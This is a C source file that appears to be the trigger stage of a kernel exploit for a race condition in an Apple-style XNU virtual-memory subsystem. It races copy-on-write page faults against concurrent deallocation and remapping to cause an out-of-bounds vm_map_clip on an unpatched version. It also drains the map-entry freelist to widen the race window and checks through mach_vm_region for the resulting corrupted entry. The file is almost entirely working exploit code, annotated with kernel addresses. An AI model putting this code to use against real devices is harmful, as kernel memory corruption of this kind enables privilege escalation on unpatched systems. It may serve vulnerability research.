#include "clipwire.h"
#include <signal.h>
#include <setjmp.h>

/* ------------------------------------------------------------------ */
/* Bug 1 trigger: unlocked vm_map_clip in the CoW submap fault path    */
/*                                                                    */
/* Confirmed (static, 26.1 0xfffffff0080b8820):                       */
/*   fault path locks the COPY-map (0xfffffff00800ab74), then         */
/*   releases it (lck_rw_done 0xfffffff00800b7ec at 0x8c2c),          */
/*   re-walks the submap (vm_map_find_entry 0xfffffff0080cce48),      */
/*   then calls clip_start / clip_end (0x8c88/0x8c98) on the entry    */
/*   with the submap's own lock NOT held and no bounds re-check.      */
/*                                                                    */
/* 26.6 fixed this: clip re-validates entry bounds after the new      */
/* entry allocation and panics ("Attempting to clip ... outside of    */
/* its bounds"). So on 26.1 a concurrent mutation of the shared       */
/* submap entry during the clip window yields an out-of-bounds clip.  */
/*                                                                    */
/* Construction: vm_remap(copy=TRUE) maps [src] as a private COW copy */
/* into dst. Writing dst faults the COW path; the kernel allocates a  */
/* fresh entry for the copied page by clipping the submap entry. The  */
/* mutator thread tears the dst mapping down / re-creates it so the   */
/* saved submap entry goes stale inside the unlocked clip window.     */
/* ------------------------------------------------------------------ */

static volatile int g_go = 0;
static cow_map_t *g_cow = NULL;
static U64 g_fault_rounds = 0;
static U64 g_fault_hits = 0;

static jmp_buf g_segv_jmp;
static volatile sig_atomic_t g_in_fault = 0;

static void segv_handler(int sig)
{
    (void)sig;
    if (g_in_fault) siglongjmp(g_segv_jmp, 1);
    _exit(128 + SIGSEGV);
}

static void *fault_thread(void *arg)
{
    (void)arg;
    while (g_go == 0) pthread_yield_np();

    struct sigaction sa = {0};
    sa.sa_handler = segv_handler;
    sigaction(SIGSEGV, &sa, NULL);

    U64 stride = g_cow->dst_size / COW_FAULT_PAGES;

    /* Fault continuously. The Bug 1 TOCTOU needs a COW fault IN FLIGHT while
     * mutate_thread deallocates/remaps the dst entry, so the fault loop must
     * not be gated by detection. The old g_round_done handshake serialized
     * fault vs teardown (faults only fired on the already-fresh mapping) and
     * never raced them at all. */
    while (g_go) {
        U64 base = g_cow->dst_addr;
        for (U64 i = 0; i < COW_FAULT_PAGES; i++) {
            volatile unsigned char *p = (unsigned char *)(base + i * stride);
            g_in_fault = 1;
            if (sigsetjmp(g_segv_jmp, 1) == 0) {
                *p = (unsigned char)(0x41 + (i & 0xf));
                g_fault_hits++;
            } else {
                /* mapping was torn down under us: skip, next round */
            }
            g_in_fault = 0;
        }
        g_fault_rounds++;
        pthread_yield_np();
    }
    return NULL;
}

static void *mutate_thread(void *arg)
{
    (void)arg;
    while (g_go == 0) pthread_yield_np();

    while (g_go) {
        U64 re_alloc = g_cow->dst_addr;
        /* free the COW'd dst mapping -> drops the submap refcount. Runs
         * concurrently with fault_thread's in-flight COW fault, which is the
         * window that opens the unlocked submap clip (Bug 1). */
        mach_vm_deallocate(mach_task_self(), g_cow->dst_addr, g_cow->dst_size);
        nsleep(50 * 1000);
        /* re-create the COW submap mapping at the same address */
        vm_prot_t cur = VM_PROT_READ | VM_PROT_WRITE;
        vm_prot_t max = VM_PROT_READ | VM_PROT_WRITE;
        kern_return_t kr = vm_remap(mach_task_self(), &re_alloc, g_cow->dst_size, 0,
                                    VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                    mach_task_self(), g_cow->src_addr, TRUE,
                                    &cur, &max, VM_INHERIT_NONE);
        if (kr == KERN_SUCCESS) {
            g_cow->dst_addr = re_alloc;
        }
    }
    return NULL;
}

bool cow_map_setup(cow_map_t *m)
{
    memset(m, 0, sizeof(*m));
    m->src_size = COW_SRC_PAGES * PAGE_SIZE_;
    m->dst_size = m->src_size;

    kern_return_t kr = mach_vm_allocate(mach_task_self(), &m->src_addr, m->src_size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        LOGBAD("mach_vm_allocate src failed: %#x", kr);
        return false;
    }
    memset((void *)m->src_addr, 0x41, m->src_size);

    vm_prot_t cur = VM_PROT_READ | VM_PROT_WRITE;
    vm_prot_t max = VM_PROT_READ | VM_PROT_WRITE;
    m->dst_addr = 0;
    kr = vm_remap(mach_task_self(), &m->dst_addr, m->dst_size, 0,
                  VM_FLAGS_ANYWHERE,
                  mach_task_self(), m->src_addr, TRUE,
                  &cur, &max, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        LOGBAD("vm_remap COW failed: %#x", kr);
        mach_vm_deallocate(mach_task_self(), m->src_addr, m->src_size);
        memset(m, 0, sizeof(*m));
        return false;
    }
    LOGOK("COW submap: src %#llx size %#llx, dst %#llx", m->src_addr, m->src_size, m->dst_addr);

    /* verify we got a private copy, not a shared mapping:
       writing dst must NOT change src */
    *(volatile unsigned char *)m->dst_addr = 0x7e;
    if ((*(volatile unsigned char *)m->src_addr) == 0x7e) {
        LOGBAD("vm_remap produced a SHARED mapping - not the COW submap path");
        return false;
    }
    LOGOK("COW semantics verified (dst write does not alias src)");
    return true;
}

void cow_map_teardown(cow_map_t *m)
{
    if (m->dst_addr) mach_vm_deallocate(mach_task_self(), m->dst_addr, m->dst_size);
    if (m->src_addr) mach_vm_deallocate(mach_task_self(), m->src_addr, m->src_size);
    memset(m, 0, sizeof(*m));
}

/* Force the vm_map_entry zone through the global (non per-cpu) path so
 * the clip's new-entry allocation takes the slow, lock-yielding path
 * (per-CPU freelist emptied). Widens the race window. */
void drain_entry_freelist(void)
{
    static mach_vm_address_t keep[FREELIST_CHURN_MAPS];
    static mach_vm_address_t drop[FREELIST_CHURN_MAPS];
    for (int i = 0; i < FREELIST_CHURN_MAPS; i++) {
        mach_vm_allocate(mach_task_self(), &keep[i], 2 * PAGE_SIZE_, VM_FLAGS_ANYWHERE);
        mach_vm_allocate(mach_task_self(), &drop[i], 2 * PAGE_SIZE_, VM_FLAGS_ANYWHERE);
    }
    for (int i = 0; i < FREELIST_CHURN_MAPS; i++) {
        mach_vm_deallocate(mach_task_self(), drop[i], 2 * PAGE_SIZE_);
    }
    LOGOK("drained vm_map_entry freelist (%d churn maps)", FREELIST_CHURN_MAPS);
    for (int i = 0; i < FREELIST_CHURN_MAPS; i++) {
        mach_vm_deallocate(mach_task_self(), keep[i], 2 * PAGE_SIZE_);
    }
}

/* A correct clip keeps [start, start+expected) as one region whose size
 * is exactly the original dst size. A stale/clipped-out-of-bounds entry
 * grows or splits the region: detect via mach_vm_region. */
bool entry_looks_corrupt(U64 start, U64 expected_size, U64 *out_size)
{
    mach_vm_address_t a = start;
    mach_vm_size_t sz = 0;
    vm_region_basic_info_data_64 info;
    mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t obj = MACH_PORT_NULL;

    kern_return_t kr = mach_vm_region(mach_task_self(), &a, &sz,
                                      VM_REGION_BASIC_INFO_64,
                                      (vm_region_info_t)&info, &cnt, &obj);
    if (obj != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), obj);
    if (kr != KERN_SUCCESS) { if (out_size) *out_size = expected_size; return false; }
    if (a != start) { if (out_size) *out_size = expected_size; return false; }

    if (sz != expected_size) {
        LOGOK("region [%#llx,%#llx) size %#llx != expected %#llx -> corrupt",
              a, a + sz, sz, expected_size);
        if (out_size) *out_size = sz;
        return true;
    }
    if (out_size) *out_size = expected_size;
    return false;
}

int run_clip_race(cow_map_t *m, U64 *corrupted_start, U64 *corrupted_end)
{
    static pthread_t fth, mth;
    g_cow = m;

    pthread_create(&fth, NULL, fault_thread, NULL);
    pthread_create(&mth, NULL, mutate_thread, NULL);

    __sync_synchronize();
    g_go = 1;

    int found = 0;
    for (U64 round = 0; round < RACE_ITERATIONS && !found; round++) {
        /* detection cadence only: fault/mutate run continuously and overlap;
         * this sleep just paces the corruption checks. */
        nsleep(20 * 1000 * 1000);

        if (round % 100 == 0) {
            LOG("race round %llu (fault_hits %llu)", round, g_fault_hits);
        }

        U64 detected_sz = m->dst_size;
        if (entry_looks_corrupt(m->dst_addr, m->dst_size, &detected_sz)) {
            LOGOK("corrupted entry detected at round %llu (size %#llx)", round, detected_sz);
            if (corrupted_start) *corrupted_start = m->dst_addr;
            if (corrupted_end) *corrupted_end = m->dst_addr + detected_sz;
            found = 1;
            break;
        }
    }

    g_go = 0;
    pthread_join(mth, NULL);
    pthread_join(fth, NULL);
    return found;
}
